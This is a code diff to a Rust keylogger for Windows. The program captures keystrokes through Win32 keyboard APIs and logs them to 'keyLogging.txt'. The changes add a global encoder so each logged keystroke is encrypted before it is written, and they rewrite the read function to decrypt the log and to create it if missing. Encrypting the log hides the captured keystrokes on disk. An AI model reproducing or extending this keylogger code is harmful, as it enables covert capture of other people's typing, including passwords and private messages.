@@ -1,5 +1,10 @@
+
 use std::fs::{self, OpenOptions};
+use std::sync::Mutex;
+use once_cell::sync::Lazy;
 use std::io::Write;
+use crate::encode::{self, Encode};
+use base64::{engine::general_purpose, Engine as _};
 
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
@@ -40,10 +45,14 @@ use windows::Win32::UI::WindowsAndMessaging::{
 
 };
 
+
 use windows::Win32::UI::Input::KeyboardAndMouse::{
 
     GetKeyState, GetKeyboardState, MapVirtualKeyA, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
 };
+
+// creates a global encoder
+static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new(52)));
 
 pub fn get_windows_version() -> &'static str{
     let mut system_info = SYSTEM_INFO::default();
@@ -161,18 +170,41 @@ unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{
 
 
 fn write_into_file(button_pressed:& str){
+    let mut enc = ENCODER.lock().unwrap();
 
     let mut data_file = OpenOptions::new()
     .create(true)
     .append(true).
     open("keyLogging.txt").expect("Cannot open file");
     
-
-    data_file.write(button_pressed.as_bytes()).expect("Failed"); 
+    let enc = enc.encrypt(button_pressed);
+    writeln!(data_file, "{}", &enc).expect("msg");
+     
 }
 
 pub fn read_file() -> String{
+    let mut dec = ENCODER.lock().unwrap();
 
-     fs::read_to_string("keyLogging.txt")
-    .expect("can't read into file")
+    dec.reset_key();
+
+    OpenOptions::new()
+        .create(true) // ← ensures the file exists
+        .append(true) // ← opens without truncating
+        .open("keyLogging.txt")
+        .expect("Failed to create or open file");
+
+    let read = fs::read_to_string("keyLogging.txt")
+    .expect("can't read into file");
+
+    let mut decode_string = String::new();
+
+    for line in read.lines(){
+        let decoded_char = dec.decrypt(line);
+
+        decode_string.push_str(&decoded_char);
+    }
+
+    dec.reset_key();
+
+    decode_string
 }
